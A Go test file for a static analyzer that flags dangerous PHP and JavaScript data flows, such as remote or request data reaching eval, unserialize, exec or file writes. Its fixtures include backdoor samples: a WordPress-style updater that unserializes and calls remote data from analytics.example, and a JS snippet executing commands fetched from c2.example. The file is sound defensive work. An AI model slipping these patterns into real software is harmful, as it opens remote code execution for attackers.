// Copyright (c) 2026 Rhythm Shahriar <me@rhy.io>
// SPDX-License-Identifier: MIT

package analyze

import (
	"slices"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/RhythmShahriar/sightread/core"
)

func flows(l lang, src string) []core.Feature {
	return flowFeatures(streamFor(l, src), []byte(src), "p/x", core.CtxCode)
}

func flowKeys(l lang, src string) []string {
	var out []string
	for _, f := range flows(l, src) {
		out = append(out, f.Key)
	}
	return out
}

const essentialPlugin = `<?php
class EP_Updater {
	public function fetch_ver_info() {
		$response = wp_remote_get( 'https://analytics.example/ver.php?d=' . home_url() );
		$body     = wp_remote_retrieve_body( $response );
		$info     = @unserialize( $body );
		return $info;
	}

	public function version_info_clean() {
		$info  = $this->fetch_ver_info();
		$clean = $info['clean'];
		@$clean( $info['a'], $info['b'] );
	}
}
`

const httpsExec = `const https = require('https');
const { exec } = require('child_process');

https.get('https://c2.example/cmd', (res) => {
  let data = '';
  res.on('data', (chunk) => { data += chunk; });
  res.on('end', () => {
    exec(data);
  });
});
`

func TestFlowPositive(t *testing.T) {
	tests := []struct {
		name string
		l    lang
		src  string
		want string
	}{
		{"essential plugin unserialize", langPHP, essentialPlugin, "remote->unserialize"},
		{"essential plugin variable call", langPHP, essentialPlugin, "remote->dyn-call"},
		{"remote eval through a variable", langPHP, `<?php
$r = wp_remote_get( $url );
$code = wp_remote_retrieve_body( $r );
eval( $code );`, "remote->eval"},
		{"decode eval through two assignments", langPHP, `<?php
$a = base64_decode( $payload );
$b = $a;
eval( $b );`, "decode->eval"},
		{"nested decode into eval", langPHP, `<?php eval(gzinflate(str_rot13(base64_decode('S0zN'))));`, "decode->eval"},
		{"decode through call_user_func of a built name", langPHP, `<?php call_user_func('ev'.'al', base64_decode($x));`, "decode->eval"},
		{"built assert", langPHP, `<?php $a = "as"."sert"; $a(base64_decode($x));`, "decode->eval"},
		{"request unserialize", langPHP, `<?php $prefs = unserialize( stripslashes( $_COOKIE['prefs'] ) );`, "request->unserialize"},
		{"php input", langPHP, `<?php $raw = file_get_contents('php://input'); maybe_unserialize($raw);`, "request->unserialize"},
		{"request variable function", langPHP, `<?php $f = $_GET['f']; $f( $_GET['a'] );`, "request->dyn-call"},
		{"request callback", langPHP, `<?php call_user_func( $_POST['cb'], 1 );`, "request->dyn-call"},
		{"request into system via a built name", langPHP, `<?php $f = 'sys' . 'tem'; $f( $_REQUEST['c'] );`, "request->exec"},
		{"remote include", langPHP, `<?php $tmp = download_url( 'https://x.example/p.zip' ); include $tmp;`, "remote->include"},
		{"remote require_once in parens", langPHP, `<?php $f = wp_remote_retrieve_body(wp_remote_get($u)); require_once( $f );`, "remote->include"},
		{"remote url reader", langPHP, `<?php $c = file_get_contents( 'https://x.example/' . $k ); eval( '?>' . $c );`, "remote->eval"},
		{"remote write code", langPHP, `<?php
$body = wp_remote_retrieve_body( wp_remote_get( $u ) );
file_put_contents( ABSPATH . 'wp-content/mu-plugins/x.php', $body );`, "remote->write-code"},
		{"remote fwrite to a handle", langPHP, `<?php
$fp = fopen( WP_PLUGIN_DIR . '/x/y.php', 'w' );
$data = curl_exec( $ch );
fwrite( $fp, $data );`, "remote->write-code"},
		{"one level into a function", langPHP, `<?php
function run_it( $c ) { eval( $c ); }
run_it( $_POST['c'] );`, "request->eval"},
		{"returned source", langPHP, `<?php
function get_payload() { return wp_remote_retrieve_body( wp_remote_get( 'https://x.example' ) ); }
$p = get_payload();
eval( $p );`, "remote->eval"},
		{"closure with use", langPHP, `<?php
$data = $_POST['d'];
add_action( 'init', function () use ( $data ) { unserialize( $data ); } );`, "request->unserialize"},
		{"closure in a variable", langPHP, `<?php
$f = function ( $x ) { eval( $x ); };
$f( $_GET['x'] );`, "request->eval"},
		{"heredoc interpolation", langPHP, "<?php $c = $_GET['c']; eval(<<<E\n$c\nE);", "request->eval"},
		{"backtick", langPHP, "<?php $c = $_GET['c']; echo `ls $c`;", "request->exec"},
		{"preg_replace e", langPHP, `<?php preg_replace( '/.*/e', $_POST['code'], '' );`, "request->eval"},
		{"env exec", langPHP, `<?php system( getenv( 'CMD' ) );`, "env->exec"},
		{"foreach binding", langPHP, `<?php foreach ( $_POST as $k => $v ) { assert( $v ); }`, "request->eval"},
		{"js https get to exec", langJS, httpsExec, "remote->exec"},
		{"js fetch then eval", langJS, `fetch(u).then(r => r.text()).then(t => eval(t));`, "remote->eval"},
		{"js await fetch", langJS, `async function f() { const r = await fetch(u); const s = await r.text(); new Function(s)(); }`, "remote->eval"},
		{"js axios", langJS, `const axios = require('axios'); axios.get(u).then(({ data }) => { require(data.mod); });`, "remote->include"},
		{"js env exec", langJS, `const cp = require('child_process'); cp.execSync(process.env.CMD);`, "env->exec"},
		{"js decode vm", langJS, `const vm = require('vm'); vm.runInNewContext(Buffer.from(p, 'base64').toString());`, "decode->eval"},
		{"js atob setTimeout", langJS, `setTimeout(atob(s), 10);`, "decode->eval"},
		{"js write code", langJS, `const fs = require('fs'); fetch(u).then(r => r.text()).then(b => fs.writeFileSync(__dirname + '/x.js', b));`, "remote->write-code"},
		{"js xhr", langJS, `var x = new XMLHttpRequest(); x.open('GET', u); x.onload = function () { eval(x.responseText); };`, "remote->eval"},
		{"js one level", langJS, `function run(c) { require('child_process').exec(c); }
fetch(u).then(r => r.text()).then(t => run(t));`, "remote->exec"},
		{"js global dynamic call", langJS, `fetch(u).then(r => r.json()).then(d => { window[d.fn](d.arg); });`, "remote->dyn-call"},
		{"js class method", langJS, `class A { go() { const { exec } = require('child_process'); exec(process.env.X); } }`, "env->exec"},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got := flowKeys(tc.l, tc.src)
			if !slices.Contains(got, tc.want) {
				t.Errorf("flows %q, want %q", got, tc.want)
			}
		})
	}
}

func TestFlowNegative(t *testing.T) {
	tests := []struct {
		name string
		l    lang
		src  string
	}{
		{"remote json only printed", langPHP, `<?php
$r = wp_remote_get( 'https://api.example/v1' );
$d = json_decode( wp_remote_retrieve_body( $r ), true );
echo esc_html( $d['name'] );
update_option( 'x', $d );`},
		{"unserialize of an option", langPHP, `<?php $x = unserialize( get_option( 'my_opt' ) ); $y = maybe_unserialize( get_post_meta( 1, 'k', true ) );`},
		{"sink in another function with no call", langPHP, `<?php
function a( $u ) { $b = wp_remote_retrieve_body( wp_remote_get( $u ) ); return strlen( $b ); }
function c( $x ) { eval( $x ); }`},
		{"reassigned before the sink", langPHP, `<?php $x = $_GET['a']; $x = 'phpinfo();'; eval( $x );`},
		{"folded harmless callee", langPHP, `<?php $cb = 'strtoupper'; echo $cb( $_GET['x'] );`},
		{"local file reader", langPHP, `<?php $c = file_get_contents( __DIR__ . '/data.txt' ); unserialize( $c );`},
		{"comparison only", langPHP, `<?php if ( $_GET['mode'] === 'x' ) { eval( 'return 1;' ); }`},
		{"method on remote response", langPHP, `<?php $r = wp_remote_get( $u ); $code = wp_remote_retrieve_response_code( $r ); include __DIR__ . '/view.php';`},
		{"write of a text file", langPHP, `<?php file_put_contents( WP_CONTENT_DIR . '/cache/x.txt', wp_remote_retrieve_body( $r ) );`},
		{"js fetch only logged", langJS, `fetch(u).then(r => r.json()).then(d => console.log(d.name));`},
		{"js literal exec", langJS, `const { exec } = require('child_process'); exec('git status', cb);`},
		{"js NODE_ENV", langJS, `if (process.env.NODE_ENV === 'production') { require('./prod'); }`},
		{"js function given to setTimeout", langJS, `fetch(u).then(r => r.text()).then(t => setTimeout(() => console.log(t), 10));`},
		{"js event handler", langJS, `const https = require('https'); https.get(u, res => { res.on('data', c => process.stdout.write(c)); });`},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			if got := flowKeys(tc.l, tc.src); len(got) > 0 {
				t.Errorf("flows %q, want none", got)
			}
		})
	}
}

func TestFlowEvidence(t *testing.T) {
	fs := flows(langPHP, essentialPlugin)
	var unser, dyn *core.Feature
	for i := range fs {
		switch fs[i].Key {
		case "remote->unserialize":
			unser = &fs[i]
		case "remote->dyn-call":
			dyn = &fs[i]
		}
	}
	if unser == nil || dyn == nil {
		t.Fatalf("flows %v", fs)
	}
	if unser.Ev.Line != 4 || unser.Ev.EndLine != 6 || unser.Ev.Func != "EP_Updater::fetch_ver_info" {
		t.Errorf("unserialize evidence %+v", unser.Ev)
	}
	if unser.Attrs["source"] != "wp_remote_get" || unser.Attrs["sink"] != "unserialize" || unser.Context != core.CtxCode {
		t.Errorf("unserialize attrs %v context %q", unser.Attrs, unser.Context)
	}
	if dyn.Ev.Func != "EP_Updater::version_info_clean" || dyn.Ev.EndLine != 13 {
		t.Errorf("dyn-call evidence %+v", dyn.Ev)
	}
	if s := unser.Ev.Snippet.String(); !strings.Contains(s, "wp_remote_get") || !strings.Contains(s, "unserialize") {
		t.Errorf("snippet %q should span source and sink", s)
	}
	// One level: the sink is in the callee, the source in the caller.
	fs = flows(langPHP, "<?php\nfunction run_it( $c ) {\n\teval( $c );\n}\nrun_it( $_POST['c'] );\n")
	if len(fs) != 1 || fs[0].Ev.Func != "run_it" || fs[0].Ev.Line != 3 || fs[0].Ev.EndLine != 5 || fs[0].Attrs["caller"] != "top level" {
		t.Errorf("one-level flow %+v", fs)
	}
	js := flows(langJS, httpsExec)
	if len(js) != 1 || js[0].Ev.Line != 4 || js[0].Ev.EndLine != 8 || js[0].Attrs["sink"] != "child_process.exec" {
		t.Errorf("js flow %+v", js)
	}
}

func TestFlowSecretsMasked(t *testing.T) {
	key := "gh" + "p_" + strings.Repeat("A1b2", 9)
	src := "<?php $t = '" + key + "'; eval( base64_decode( $_GET['x'] . $t ) );"
	for _, f := range flows(langPHP, src) {
		if strings.Contains(f.Ev.Snippet.String(), key) {
			t.Errorf("snippet leaks the key: %q", f.Ev.Snippet.String())
		}
	}
}

var flowSeeds = []string{
	essentialPlugin, httpsExec,
	`<?php $f = function($x) use (&$y) { $y = $x; }; $f($_GET[1]); eval($y);`,
	`a = b => c => d => e(f)(g)`,
	`<?php fn($x) => fn($y) => eval($x . $y);`,
	`((((((((((`, `<?php ${${${${'a'}}}}();`, "`${`${`${a}`}`}`",
	`class { [x]() {} static { y() } }`, `<?php class A { function __construct() { $this->{$_GET['m']}(); } }`,
}

func FuzzFlow(f *testing.F) {
	for _, s := range flowSeeds {
		f.Add([]byte(s), false)
		f.Add([]byte(s), true)
	}
	f.Fuzz(func(t *testing.T, src []byte, isJS bool) {
		l := langPHP
		if isJS {
			l = langJS
		}
		start := time.Now()
		fs := flowFeatures(streamFor(l, string(src)), src, "f", core.CtxCode)
		if d := time.Since(start); d > 2*time.Second*raceSlowdown {
			t.Fatalf("analysing %d bytes took %v", len(src), d)
		}
		for _, ft := range fs {
			if ft.Kind != core.FFlow || ft.Ev.Line < 1 || ft.Ev.EndLine < ft.Ev.Line {
				t.Fatalf("bad feature %+v", ft)
			}
		}
	})
}

// TestFlowBlowup feeds shapes that would be exponential if closures
// ran once per caller: each level calls the one before twice.
func TestFlowBlowup(t *testing.T) {
	var b strings.Builder
	b.WriteString("<?php $f0 = fn($x) => eval($x);\n")
	for i := 1; i < 60; i++ {
		b.WriteString("$f" + itoaT(i) + " = function($x) { $f" + itoaT(i-1) + "($x); $f" + itoaT(i-1) + "($x); };\n")
	}
	b.WriteString("$f59($_GET['x']);\n")
	start := time.Now()
	_ = flows(langPHP, b.String())
	if d := time.Since(start); d > 2*time.Second*raceSlowdown {
		t.Errorf("took %v", d)
	}
	deep := strings.Repeat("(", 5000) + "x" + strings.Repeat(")", 5000)
	_ = flows(langJS, deep)
	_ = flows(langPHP, "<?php "+strings.Repeat("[", 5000))
}

func itoaT(i int) string { return strconv.Itoa(i) }
